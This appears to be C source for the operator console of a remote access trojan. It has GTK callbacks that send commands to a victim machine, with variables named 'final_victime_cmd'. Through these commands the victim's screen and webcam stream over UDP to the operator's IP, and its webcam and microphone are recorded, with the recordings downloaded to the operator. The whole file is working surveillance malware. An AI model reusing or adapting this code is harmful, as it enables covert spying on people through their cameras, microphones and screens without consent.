#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/callbacks_execute_commands.h"
#include "../includes/constants.h"
#include "../includes/utils.h"

GtkWidget *main_win;

const gchar *server_ip;
const gchar *server_port;
uint16_t port;

GtkWidget *text_view;

void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
{
    GtkWidget *IP_dialog = NULL;
    const gchar *IP = NULL;
    GtkWidget *IP_entry = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;


    int err = 0;
    size_t flag_watch = 13;

    //const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=810,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=900,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "cb_watch_remote_desktop()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);

    IP_entry  = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);


    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
    case GTK_RESPONSE_APPLY:
        IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
        //gtk_widget_destroy(IP_dialog);
        break;

    default:
        gtk_widget_destroy(IP_dialog);
        return;
    }

    final_victime_cmd = malloc(512 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_watch_remote_desktop()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strncat(final_victime_cmd, "host=", 6);
    final_victime_cmd = strncat(final_victime_cmd, IP, 15);
    final_victime_cmd = strncat(final_victime_cmd, " ", 2);
    final_victime_cmd = strncat(final_victime_cmd, "port=", 6);
    final_victime_cmd = strncat(final_victime_cmd, server_port, 5);

    gtk_widget_destroy(IP_dialog);

    printf("\n\nCommand : %s\n\n", final_victime_cmd);


    //usleep(400);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_watch_remote_desktop()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_watch_remote_desktop()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_watch_remote_desktop()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_watch_remote_desktop()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_watch_remote_desktop()");
        exit(-1);
    }

    pipe = popen(command_user, "w");
    if(pipe == NULL)
    {
        error("popen() pipe", "cb_watch_remote_desktop()");
        exit(-1);
    }

    pclose(pipe);

    free(final_victime_cmd);

    shutdown(sock, SHUT_RDWR);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}

//gst-launch filesrc location=output.mp4 typefind=true ! aiurdemux name=demux demux. ! queue max-size-buffers=0 max-size-time=0 ! mfw_isink axis-left=0 axis-top=0 disp-width=720 disp-height=480 demux. ! queue max-size-buffers=0 max-size-time=0 ! audioconvert ! ‘audio/x-raw-int,channels=2’ ! alsasink

void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
{
    GtkWidget *IP_dialog = NULL;
    const gchar *IP = NULL;
    GtkWidget *IP_entry = NULL;

    GtkWidget *webcam_not_activated = NULL;
    GtkWidget *close_hodin = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;


    int err = 0;
    size_t flag_watch = 12;

    //gst-launch-1.0 -v v4l2src ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=900,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink host=192.168.1.36 port=4444

    const gchar *command_victime_temp = "gst-launch-1.0 -v v4l2src ! videoconvert ! videoscale ! video/x-raw,format=I420,width=960,height=600,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "cb_stream_the_webcam()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);

    IP_entry  = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);


    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
    case GTK_RESPONSE_APPLY:
        IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
        gtk_widget_hide(IP_dialog);
        break;

    default:
        gtk_widget_destroy(IP_dialog);
        return;
    }

    final_victime_cmd = malloc(512 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_stream_the_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strncat(final_victime_cmd, "host=", 6);
    final_victime_cmd = strncat(final_victime_cmd, IP, 15);
    final_victime_cmd = strncat(final_victime_cmd, " ", 2);
    final_victime_cmd = strncat(final_victime_cmd, "port=", 5);
    final_victime_cmd = strncat(final_victime_cmd, server_port, 5);

    gtk_widget_destroy(IP_dialog);

    printf("\n\nCommand : %s\n\n", final_victime_cmd);


    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_stream_the_webcam()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_stream_the_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_stream_the_webcam()");
        exit(-1);
    }

    pipe = popen(command_user, "w");
    if(pipe == NULL)
    {
        webcam_not_activated = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "Webcam is not activated !\nPlease execute the script: activate_the_webcam.sh\n\nCommand : bash activate_the_webcam.sh");
        gtk_widget_set_size_request(webcam_not_activated, 370, 120);

        gtk_widget_show_all(GTK_DIALOG(webcam_not_activated)->vbox);
        gtk_dialog_run(GTK_DIALOG(webcam_not_activated));
        gtk_widget_destroy(webcam_not_activated);

        close_hodin = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Do you wanto to close the program ?");

        switch(gtk_dialog_run(GTK_DIALOG(close_hodin)))
        {
            case GTK_RESPONSE_YES:
                gtk_widget_destroy(close_hodin);
                exit(0);

            case GTK_RESPONSE_NO:
                gtk_widget_destroy(close_hodin);
                return;

            default :
                gtk_widget_destroy(close_hodin);
                return;
        }

        error("popen() pipe", "cb_stream_the_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_stream_the_webcam()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_stream_the_webcam()");
        exit(-1);
    }

    pclose(pipe);

    free(final_victime_cmd);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}


void cb_record_webcam(GtkButton *button, gpointer user_data)
{
    GtkWidget *number_frames_dialog = NULL;
    const gchar *number_of_frames = NULL;
    GtkWidget *frames_entry = NULL;
    
    GtkWidget *recording = NULL;

    GtkWidget *too_much_frames_dialog = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_watch = 14;
    
    char *buffer = NULL;

    FILE *record = NULL;
    
    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;
    
    GtkWidget *progress_bar_webcam = NULL;
    GtkWidget *pbar_hbox = NULL;
    gdouble step_foreward  = 0.0;
    
    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    //gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=500 ! "video/x-raw,width=1440,framerate=30/1" ! videorate ! "video/x-raw,framerate=30/1" ! jpegenc ! avimux ! filesink location=output.avi

    const gchar *command_victime_temp = "gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    number_of_frames = malloc(16 * sizeof(char));
    if(number_of_frames == NULL)
    {
        error("malloc() number_of_frames", "cb_record_webcam()");
        exit(-1);
    }

    number_frames_dialog = gtk_dialog_new_with_buttons("How many frames you want to record ? (500 ~ 1min / max 5000)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);
    gtk_widget_set_size_request(number_frames_dialog, 500, 100);

    frames_entry  = gtk_entry_new_with_max_length(8);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), frames_entry, TRUE, FALSE, 0);

    pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_webcam = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_webcam, 130, 10);
    
    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_webcam), "%p%%");
    
    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_webcam), TRUE);    
    
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(number_frames_dialog)->vbox), progress_bar_webcam, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(number_frames_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(number_frames_dialog)))
    {
        case GTK_RESPONSE_OK:
            number_of_frames = gtk_entry_get_text(GTK_ENTRY(frames_entry));
            if(atoi(number_of_frames) > 5000 || atoi(number_of_frames) < 1)
            {
                too_much_frames_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "You can't record so much frames !");
                gtk_widget_set_size_request(too_much_frames_dialog, 300, 100);

                gtk_widget_show_all(GTK_DIALOG(too_much_frames_dialog)->vbox);
                gtk_dialog_run(GTK_DIALOG(too_much_frames_dialog));

                gtk_widget_destroy(too_much_frames_dialog);
                gtk_widget_destroy(number_frames_dialog);
                return;
            }

            break;

        default:
            gtk_widget_destroy(number_frames_dialog);
            return;
    }

    final_victime_cmd = malloc(512 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_record_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strncat(final_victime_cmd, number_of_frames, strlen(number_of_frames));
    final_victime_cmd = strncat(final_victime_cmd, " ! video/x-raw,width=640,framerate=30/1 ! videorate ! video/x-raw,framerate=30/1 ! jpegenc ! avimux ! filesink location=output.avi", 132);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_record_webcam()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_record_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_record_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_record_webcam()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_record_webcam()");
        exit(-1);
    }

    record = fopen("output.avi", "wb");
    if(record == NULL)
    {
        error("fopen() output.avi", "cb_record_webcam()");
        exit(-1);
    }

    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "cb_record_webcam()");
        exit(-1);
    }
    
    buffer = malloc(data_len * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc buffer", "cb_record_webcam()");
        return; 
    }

    printf("le fichier fait : %ld octets\n\n", data_len);
    
    recording = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_NONE, "End of Record ...");
    gtk_widget_show_all(GTK_DIALOG(recording)->vbox);
    gtk_dialog_run(GTK_DIALOG(recording));
    gtk_widget_destroy(recording);
    
    gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_webcam), 0.0);
    gtk_grab_add(number_frames_dialog);

    do
    {
        tailleBlockRecut = recv(sock, buffer, data_len, 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, record);

        totalRcv += tailleBlockRecut;

        step_foreward = ((gdouble)totalRcv * 1.0) / (gdouble)data_len;

        if(step_foreward > 1.0)
            step_foreward = 0.0;
        
        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_webcam), step_foreward);
        gtk_main_iteration();

    }while(totalRcv < data_len);
    
    gtk_grab_remove(number_frames_dialog);
    
    /** Obtaining the buffer associated with the widget. **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Webcam have been recorded ...", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);
    g_free(text);

    //printf("Reception du fichier video success : %ld !!\n", totalRcv);

    free(final_victime_cmd);
    gtk_widget_destroy(number_frames_dialog);
    free(buffer);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}

void cb_record_micro(GtkButton *button, gpointer user_data)
{
    GtkWidget *ready_to_record = NULL;
    const gchar *time_of_record = NULL;
    GtkWidget *time_of_rec_dialog = NULL;
    GtkWidget *time_of_rec_entry = NULL;
    GtkWidget *time_too_long_dialog = NULL;
    
    GtkWidget *confirmation_script_dialog = NULL;
    
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    int recorded = 0;
    size_t flag_watch = 17;
   
    char buffer[BUFSIZ] = "";

    FILE *record = NULL;
    
    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;
    
    GtkWidget *progress_bar_micro = NULL;
    GtkWidget *pbar_hbox = NULL;
    gdouble step_foreward  = 0.0;
    
    GtkWidget *select_src_dialog = NULL;
    GtkWidget *target_OS_entry = NULL;
    const gchar *target_OS = NULL;
    
    GtkWidget *check_input_dialog = NULL;
     
    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;
    
     //"gst-launch-1.0 -v alsasrc num-buffers= 500 ! wavenc ! filesink location=output.wav"
    //gst-launch-1.0 -v pulsesrc num-buffers= 500 ! wavenc ! filesink location=output.wav
    
    
    select_src_dialog = gtk_dialog_new_with_buttons("Enter the target OS : Ubuntu/Mint/Kali/Debian/Fedora", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    gtk_widget_set_size_request(select_src_dialog, 360, 100);

    target_OS_entry  = gtk_entry_new();
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(select_src_dialog)->vbox), target_OS_entry, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(select_src_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(select_src_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            target_OS = gtk_entry_get_text(GTK_ENTRY(target_OS_entry));
            gtk_widget_hide(select_src_dialog);
            break;

        default:
            gtk_widget_destroy(select_src_dialog);
            return;
    }
    
    
    if(memcmp(target_OS, "Ubuntu", 6) != 0 && memcmp(target_OS, "Mint", 4) != 0 && memcmp(target_OS, "Kali", 4) != 0 && memcmp(target_OS, "Debian", 6) != 0 && memcmp(target_OS, "Fedora", 6) != 0)
    {
        check_input_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_OK, "You did not entered a correct value ....");

        gtk_widget_show_all(GTK_DIALOG(check_input_dialog)->vbox);
        switch(gtk_dialog_run(GTK_DIALOG(check_input_dialog)))
        {
            case GTK_RESPONSE_OK:
                gtk_widget_destroy(check_input_dialog);
                return;

            default :
                gtk_widget_destroy(check_input_dialog);
                return;
        }   
    }
    
    const gchar *command_victime_temp = ""; 
    
    if(strncmp(target_OS, "Ubuntu", 6) == 0 || strncmp(target_OS, "Kali", 4) == 0 || strncmp(target_OS, "Mint", 4) == 0)
        command_victime_temp = "gst-launch-1.0 -v alsasrc num-buffers=";
    
    if(strncmp(target_OS, "Debian", 6) == 0 || strncmp(target_OS, "Fedora", 6) == 0)
        command_victime_temp = "gst-launch-1.0 -v pulsesrc num-buffers=";
    
    gchar *final_victime_cmd = NULL;
    
    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    time_of_record = malloc(16 * sizeof(char));
    if(time_of_record == NULL)
    {
        error("malloc() time_of_record", "cb_record_webcam()");
        exit(-1);
    }

    time_of_rec_dialog = gtk_dialog_new_with_buttons("How many time you want to record ? ((1000 ~ 10sec / on Debian & Fedora 1200 ~ 2min) / max = 60000)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_OK, GTK_RESPONSE_OK, NULL);
    gtk_widget_set_size_request(time_of_rec_dialog, 670, 100);

    time_of_rec_entry  = gtk_entry_new_with_max_length(8);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_of_rec_dialog)->vbox), time_of_rec_entry, TRUE, FALSE, 0);
     
    pbar_hbox = gtk_hbox_new(TRUE, 0);
    progress_bar_micro = gtk_progress_bar_new();
    gtk_widget_set_size_request(progress_bar_micro, 130, 10);
    
    gtk_progress_set_format_string (GTK_PROGRESS(progress_bar_micro), "%p%%");
    
    gtk_progress_set_show_text(GTK_PROGRESS(progress_bar_micro), TRUE); 
    
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_of_rec_dialog)->vbox), progress_bar_micro, TRUE, FALSE, 0);
  
    gtk_widget_show_all(GTK_DIALOG(time_of_rec_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_of_rec_dialog)))
    {
        case GTK_RESPONSE_OK:
            time_of_record = gtk_entry_get_text(GTK_ENTRY(time_of_rec_entry));
            if(atoi(time_of_record) > 60000 || atoi(time_of_record) < 1)
            {
                time_too_long_dialog = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE, "You can't record so much time !");
                gtk_widget_set_size_request(time_too_long_dialog, 300, 100);

                gtk_widget_show_all(GTK_DIALOG(time_too_long_dialog)->vbox);
                gtk_dialog_run(GTK_DIALOG(time_too_long_dialog));

                gtk_widget_destroy(time_too_long_dialog);
                gtk_widget_destroy(time_of_rec_dialog);
                gtk_widget_destroy(select_src_dialog);
                return;
            }
            break;

        default:
            gtk_widget_destroy(time_of_rec_dialog);
            return;
    }
    
    ready_to_record = gtk_message_dialog_new(GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Ready for recording audio ?");
    
    gtk_widget_show_all(GTK_DIALOG(ready_to_record)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(ready_to_record)))
    {
        case GTK_RESPONSE_YES:
             gtk_widget_destroy(ready_to_record);
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(ready_to_record);
            return;

        default :
            gtk_widget_destroy(ready_to_record);
            return;
    }
    
    final_victime_cmd = malloc(512 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_record_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strncat(final_victime_cmd, time_of_record, strlen(time_of_record));
    final_victime_cmd = strncat(final_victime_cmd, " ! wavenc ! filesink location=output.wav", 40);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_record_micro()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_record_micro()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_record_micro()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_record_micro()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_record_micro()");
        exit(-1);
    }
    
    if(recv(sock, (char*)&recorded, sizeof(recorded), 0) == SOCKET_ERROR)
    {
        error("recv() recorded", "cb_record_micro()");
        exit(-1);
    }

    if(recorded == 1)
    {
        /** Obtaining the buffer associated with the widget. **/
        text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);

        /** Set the default buffer text. **/
        gtk_text_buffer_set_text(text_buffer, "Audio have been recorded ...", -1);

        /** Obtain iters for the start and end of points of the buffer **/
        gtk_text_buffer_get_start_iter(text_buffer, &start);
        gtk_text_buffer_get_end_iter(text_buffer, &end);

        /** Get the entire buffer text. **/
        text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

        /** Print the text **/
        g_print("%s", text);

        g_free(text);

        confirmation_script_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_NONE, "Audio have been recorded ...");

        switch(gtk_dialog_run(GTK_DIALOG(confirmation_script_dialog)))
        {
            default :
                gtk_widget_destroy(confirmation_script_dialog);
                break;
        }
    }
    

    record = fopen("output.mp3", "wb");
    if(record == NULL)
    {
        error("fopen() output.mp3", "cb_record_micro()");
        exit(-1);
    }

    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "cb_record_micro()");
        exit(-1);
    }

    printf("le fichier fait : %ld octets\n\n", data_len);
    
    gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_micro), 0.0);
    
    gtk_grab_add(progress_bar_micro);
    do
    {
        tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, record);

        totalRcv += tailleBlockRecut;
        
        step_foreward = ((gdouble)totalRcv * 1.0) / (gdouble)data_len;

        if(step_foreward > 1.0)
            step_foreward = 0.0;
        
        gtk_progress_bar_set_fraction(GTK_PROGRESS_BAR(progress_bar_micro), step_foreward);
        gtk_main_iteration();

    }while(totalRcv < data_len);
    
    gtk_grab_remove(progress_bar_micro);

    printf("Reception du fichier audio success : %ld !!\n", totalRcv);
    
    gtk_widget_destroy(time_of_rec_dialog);
    gtk_widget_destroy(select_src_dialog);
    
    /** Obtaining the buffer associated with the widget. **/
    text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Audio File have been downloaded ...", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);
    g_free(text);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}

